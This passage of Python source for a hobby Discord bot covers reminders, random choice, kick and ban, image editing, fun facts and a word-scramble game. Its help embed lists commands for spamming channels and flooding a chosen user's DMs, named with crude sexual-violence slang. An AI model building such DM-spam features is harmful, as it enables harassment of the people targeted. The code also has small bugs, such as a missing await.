            await interaction.response.send_message(f"Succesfully sent suggestion to Dovyrn!\nHopefully he will add it soon.")
        except discord.Forbidden:
            await interaction.response.send_message(f"Oops!, Failed to send suggestion to Dovyrn!\nPlease let him know.")
    except discord.NotFound:
        interaction.response.send_message(f"Looks like dovyrn is uncapable of coding such a simple thing. He cant even find his own userid!\nSpam his dms to let him know!")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send(f"Command is on cooldown. Try again after {int(error.retry_after)} seconds.")

@bot.tree.command(name="remind", description="Set a reminder.")
@app_commands.describe(time="Time to wait before the reminder", message="Reminder message")
async def remind(interaction: discord.Interaction, time: str, message: str):
    # Convert time to seconds (this is a simple parser, you can expand this)
    time_units = {
        's': 1,  # seconds
        'm': 60,  # minutes
        'h': 3600  # hours
    }

    if time[-1] in time_units and time[:-1].isdigit():
        wait_time = int(time[:-1]) * time_units[time[-1]]
        await interaction.response.send_message(f"Reminder set! I will remind you in {time}.", ephemeral=True)
        
        await asyncio.sleep(wait_time)  # Wait for the specified time
        await interaction.user.send(f"Reminder: {message}")  # Send a DM to the user
    else:
        await interaction.response.send_message("Invalid time format! Use a format like `10s` for seconds, `5m` for minutes, or `1h` for hours.", ephemeral=True)
        
@bot.tree.command(name="choose", description="Randomly choose one option from a list of provided choices.")
@app_commands.describe(options="Enter multiple options separated by commas")
async def choose(interaction: discord.Interaction, options: str):
    # Split the options into a list
    choices = options.split(',')
    
    # Strip whitespace and choose a random option
    selected = random.choice([option.strip() for option in choices])
    
    # Send the selected choice
    await interaction.response.send_message(f"I choose: {selected}")


@bot.tree.command(name="kick", description="Kick a member from the server.")
@app_commands.describe(member="The member to kick", reason="(Optional) Reason for kicking the member")
async def kick(interaction: discord.Interaction, member: discord.Member, reason: str = None):
    if interaction.user.guild_permissions.kick_members:
    # Check if the user has permission to kick members
        try:
            await member.kick(reason=reason)
            await interaction.response.send_message(f"{member.display_name} has been kicked from the server.", ephemeral=True)
        except discord.Forbidden:
            await interaction.response.send_message("I do not have permission to kick this member.", ephemeral=True)
        except discord.HTTPException:
            await interaction.response.send_message("Failed to kick the member due to an HTTP error.", ephemeral=True)
    else:
        await interaction.response.send_message("You do not have permission to kick members.", ephemeral=True)
@bot.tree.command(name="ban", description="Bans a member from the server")
@app_commands.describe(member="The member to ban", reason="(Optional) Reason for banning the member")
async def ban(interaction: discord.Interaction, member : discord.Member,reason: str = None):
    if interaction.user.guild_permissions.ban_members:  # Check if the user has permission to ban members
        # Check if the user has permission to ban members
        try:
            await member.ban(reason=reason)
            await interaction.response.send_message(f"{member.display_name} has been banned from the server.", ephemeral=True)
        except discord.Forbidden:
            await interaction.response.send_message("I do not have permission to ban this member.", ephemeral=True)
        except discord.HTTPException:
            await interaction.response.send_message("Failed to ban the member due to an HTTP error.", ephemeral=True)
    else:
        await interaction.response.send_message("You do not have permission to ban members.", ephemeral=True)

@bot.tree.command(name="gif", description="Convert an uploaded image to a GIF")
async def convert_to_gif(interaction: discord.Interaction, attachment: discord.Attachment):
    # Defer the response to avoid timing out
    await interaction.response.defer()

    if not attachment:
        await interaction.followup.send("Please upload an image to convert.", ephemeral=True)
        return
    
    # Download the image
    image_data = await attachment.read()
    
    # Open the image with Pillow
    try:
        image = Image.open(io.BytesIO(image_data))
    except Exception as e:
        await interaction.followup.send(f"Failed to open the image: {e}", ephemeral=True)
        return
    
    # Convert the image to RGB mode if needed
    if image.mode != 'RGB':
        image = image.convert('RGB')
    
    # Save the image as a GIF
    gif_buffer = io.BytesIO()
    image.save(gif_buffer, format='GIF')
    gif_buffer.seek(0)
    
    # Send the GIF back to the user using followup
    await interaction.followup.send(file=discord.File(gif_buffer, filename="converted.gif"))

@bot.tree.command(name="funfact", description="Get a random fun fact from the web.")
async def funfact(interaction: discord.Interaction):
    # Fetch a random fun fact
    fact = await fetch_fun_fact()

    frequent_uses.update({interaction.user.id: +1})
    
    # Send the fun fact to the user
    await interaction.response.send_message(f"🧠 Fun Fact: {fact}")

@bot.tree.command(name="motivational_quotes", description= "Get a random motivational quote from the web.")
async def motivational_quote(interaction : discord.Interaction):
    quote = await fetch_motivational_quotes()

    await interaction.response.send_message(f"💪 Motivational quote: {quote}")

@bot.tree.command(name="denga_denga",description="Denga denga?")
async def denga_denga(interaction: discord.Interaction):
    await interaction.response.send_message(random.choice(bangla_list))

@bot.tree.command(name="speechbubble", description="Add a speech bubble to your image.")
async def speechbubble(interaction: discord.Interaction, attachment: discord.Attachment):
    # Defer to avoid timeout
    await interaction.response.defer()

    if not attachment:
        await interaction.followup.send("Please attach an image!", ephemeral=True)
        return

    # Download the attached image
    image_data = await attachment.read()
    try:
        base_image = Image.open(io.BytesIO(image_data)).convert("RGBA")  # Convert to RGBA to ensure transparency
    except Exception as e:
        await interaction.followup.send(f"Could not open the image: {e}", ephemeral=True)
        return

    # Resize the speech bubble to fit the base image
    bubble_resized = bubble_image.resize((base_image.width, base_image.height // 4), Image.LANCZOS)

    # Create a new base image to hold the result (to handle transparency properly)
    new_image = Image.new("RGBA", base_image.size)  # Transparent background
    new_image.paste(base_image, (0, 0))  # Paste the base image onto the new one

    # Add the speech bubble at the top of the new base image
    new_image.paste(bubble_resized, (0, 0), bubble_resized.split()[3])  # Use the alpha channel as a mask

    # Save the result to a BytesIO object
    final_buffer = io.BytesIO()
    new_image.save(final_buffer, format="PNG")
    final_buffer.seek(0)

    # Send the modified image back as a response
    await interaction.followup.send(file=discord.File(final_buffer, filename="speechbubble_image.png"))
@bot.tree.command(name="scramble", description="Unscramble the given word!")
async def scramble(interaction: discord.Interaction):
    word = random.choice(words)
    scrambled_word = ''.join(random.sample(word, len(word)))

    await interaction.response.send_message(f"Unscramble the word: **{scrambled_word}**")

    # Record the start time
    start_time = time.time()

    def check(m):
        return m.author == interaction.user and m.channel == interaction.channel

    try:
        guess = await bot.wait_for('message', timeout=15.0, check=check)
        
        # Calculate the time taken to guess
        end_time = time.time()
        time_taken = end_time - start_time  # Calculate time in seconds

        if guess.content.lower() == word:
            await interaction.channel.send(f"Correct! 🎉 It took you {time_taken:.2f} seconds.")
        else:
            await interaction.channel.send(f"Wrong! The correct word was **{word}**.")

    except asyncio.TimeoutError:
        await interaction.channel.send(f"Time's up! The correct word was **{word}**.")

@bot.tree.command(name="help", description="Show available commands and their descriptions.")
async def help_command(interaction: discord.Interaction):
    embed = discord.Embed(
        title="Help - Available Commands",
        color=discord.Color.blue()
    )

    embed.add_field(
        name="/create_invite",
        value="Creates an invite link to a text channel in the server.",
        inline=False
    )
    embed.add_field(
        name="/alive",
        value="Check if the bot is alive.",
        inline=False
    )
    embed.add_field(
        name="/rape",
        value="Sends a DM to a mentioned user.",
        inline=False
    )
    embed.add_field(
        name="/spam <message> <amount>",
        value="Spams the channel with the specified message. (Max 25 messages for non-admins)",
        inline=False
    )
    embed.add_field(
        name="/purge <amount>",
        value="Deletes a specified number of messages from the channel.",
        inline=False
    )
    embed.add_field(
        name="/spam_rape <user>",
        value="Spams a DM to the specified user.",
        inline=False
    )
    embed.add_field(
        name="/suggest <suggestion>",
        value="Submit a suggestion to the server.",
        inline=False
    )
    embed.add_field(
        name="/remind <time> <message>",
        value="Set a reminder for a specified time and message.",
        inline=False
    )
    embed.add_field(
        name="/choose <option1, option2, ...>",
        value="Randomly choose one option from a list.",
        inline=False
    )
    embed.add_field(
        name="/kick <user>",
        value="Kick a specified user from the server.",
        inline=False
    )
    embed.add_field(
        name="/ban <user>",
        value="Ban a specified user from the server.",
        inline=False
    )
    embed.add_field(
        name="/funfact",
        value="Get a random fun fact from the web.",
        inline=False
    )
    embed.add_field(
        name="/motivational_quotes",
        value="Get a random motivational quote from the web.",
        inline=False
    )
    embed.add_field(
        name="/denga_denga",
        value="Fun command with a playful response.",
        inline=False
    )
    embed.add_field(
        name="/scramble",
        value="Unscramble the given word!",
        inline=False
    )
    embed.add_field(
        name="/hello",
        value="Greet the bot.",
        inline=False
    )

    await interaction.response.send_message(embed=embed)



@bot.tree.command(name="hello")
async def hello(interaction : discord.Interaction):
    await interaction.response.send_message(f"Hello, {interaction.user.mention}!",
                                            ephemeral=True)
    


bot.run(token)
